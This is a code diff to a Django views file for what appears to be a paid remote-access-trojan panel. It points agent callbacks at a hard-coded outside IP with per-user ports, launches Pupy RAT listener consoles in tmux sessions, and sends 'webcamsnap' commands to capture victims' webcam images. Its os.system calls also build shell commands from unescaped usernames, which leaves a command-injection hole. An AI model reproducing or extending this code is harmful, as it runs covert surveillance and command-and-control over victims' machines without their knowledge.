@@ -19,7 +19,8 @@ def add(request):
     if credits.number > 0:
         credits.number-=1
         credits.save()
-        host='0.tcp.ngrok.io:11681'
+        port = 4444+int(request.user.id)
+        host='185.120.221.217:'+str(port)
         username = request.user.username
         dir = '/root/django/users/'+ str(username)+'/'+str(username)
         d=os.system('mkdir /root/django/users/'+ str(username))
@@ -40,7 +41,7 @@ def listen(request):
     username = request.user.username
     dir = '/root/django/users/'+ str(username)+'/'+str(username)
     commandd = "tmux new-session -s "+str(username)
-    os.system('xterm -T "'+str(username)+'" -e '+str(commandd))
+    os.system('xterm -T "'+str(username)+'-pupy" -e '+str(commandd))
     return render(
         request,
         'listen.html',
@@ -51,7 +52,7 @@ def startlisten(request):
     username = request.user.username
     dir = '/root/django/users/'+ str(username)+'/'+str(username)
 
-    os.system('tmux send-keys -t '+str(username)+' "/root/django/pupy/pupy/pupysh.py""\n"')
+    os.system('tmux send-keys -t '+str(username)+'-pupy" /root/django/pupy/pupy/pupysh.py""\n"')
 
     return redirect('RAT:listen')
 
@@ -59,7 +60,7 @@ def webcamsnap(request):
     username = request.user.username
     dir = '/root/django/users/'+ str(username)+'/'
 
-    os.system('tmux send-keys -t '+str(username)+' "webcamsnap -d 1 -o '+str(dir)+'""\n"')
-    os.system('tmux send-keys -t '+str(username)+' "webcamsnap -d 2 -o '+str(dir)+'""\n"')
+    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 1 -o '+str(dir)+'""\n"')
+    os.system('tmux send-keys -t '+str(username)+'-pupy "webcamsnap -d 2 -o '+str(dir)+'""\n"')
 
     return redirect('RAT:listen')
